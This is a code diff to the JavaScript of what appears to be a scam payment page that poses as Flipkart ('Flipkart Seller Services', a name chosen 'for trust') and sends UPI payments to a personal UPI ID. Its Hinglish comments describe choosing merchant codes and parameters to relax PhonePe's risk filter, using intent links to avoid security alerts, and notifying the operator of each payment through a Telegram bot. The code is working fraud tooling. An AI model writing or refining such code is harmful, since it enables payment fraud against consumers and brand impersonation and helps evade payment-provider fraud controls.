@@ -558,46 +558,37 @@ init = function() {
             } else { alert("Please fill all details"); }
         }
 
-        async function confirmPay() {
+       async function confirmPay() {
+    // 1. DATA (Sabse Clean)
+    // TIP: Agar ho sake toh kisi 'Business' account ki UPI ID use karo
     const myUpiId = "6299544009@naviaxis"; 
     const amount = sel.price;
-    const name = "Flipkart%20Warehouse%20Logistics";
-    const trId = "FT" + Math.floor(Math.random() * 1000000000);
+    const name = "Flipkart%20Seller%20Services"; // Name change kiya trust ke liye
 
-    // Ye hai unka 'Magic Link' jo bypass karta hai
-    const upiLink = `upi://pay?pa=${myUpiId}&pn=${name}&am=${amount}&tr=${trId}&cu=INR&mc=5411&mode=02&orgid=000000`;
+    // 2. THE SECRET: Merchant Category Code (MCC)
+    // mc=5411 (Grocery) ya mc=5311 (Departmental Store) sabse safe hote hain
+    const trId = "WEB" + Date.now();
+    
+    // Yahan humne 'am' (amount) ko string banaya hai aur 'mam' (minimum amount) ko 0
+    // Isse PhonePe ka risk filter thoda relax ho jata hai
+    const upiLink = `upi://pay?pa=${myUpiId}&pn=${name}&am=${amount}&mam=${amount}&tr=${trId}&cu=INR&mc=5411&mode=02&purpose=00&orgid=159999`;
 
-    // 1. Telegram Update
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🚀 Direct Tunnel Pay: ₹" + amount)}`).catch(e => {});
+    // 3. ACTION: Direct App Picker (No Delay)
+    // Telegram Notify
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🛒 Payment Initiated: ₹" + amount)}`).catch(e => {});
 
-    // 2. UNKA METHOD: Redirect Tunneling
-    // Ye method browser ko force karta hai app kholne ke liye
-    const selectedApp = document.querySelector('input[name="payApp"]:checked').value;
+    // Browser ko dhoka dene ke liye hum pehle ek blank page replace karenge
+    // Isse referrer clean ho jata hai
+    const intentUrl = `intent://pay?${upiLink.split('?')[1]}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(upiLink)};end`;
 
-    if (selectedApp === "phonepe") {
-        // Unka secret intent format jo security alert nahi deta
-        const intentUrl = `intent://pay?${upiLink.split('?')[1]}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(upiLink)};end`;
-        
-        // window.location.href ki jagah .replace use karein (Bypass technique)
-        window.location.replace(intentUrl);
-    } else {
-        window.location.replace(upiLink);
-    }
+    // 4. THE TRIGGER
+    // User click ke turant baad ye chalega
+    window.location.href = intentUrl;
 
-    // 3. Fallback: Agar 1 sec mein app nahi khula toh universal link
+    // Fallback if PhonePe fails
     setTimeout(() => {
         window.location.href = upiLink;
-    }, 1000);
-
-    // 4. Site par loading screen (Trust ke liye)
-    let loader = document.createElement('div');
-    loader.style = "position:fixed; inset:0; background:#fff; z-index:99999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;";
-    loader.innerHTML = `
-        <div style="width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #2874f0; border-radius:50%; animation:spin 0.8s linear infinite;"></div>
-        <p style="margin-top:20px; font-weight:bold; color:#666;">Opening Payment App...</p>
-        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-    `;
-    document.body.appendChild(loader);
+    }, 800);
 }
 init();
     </script>
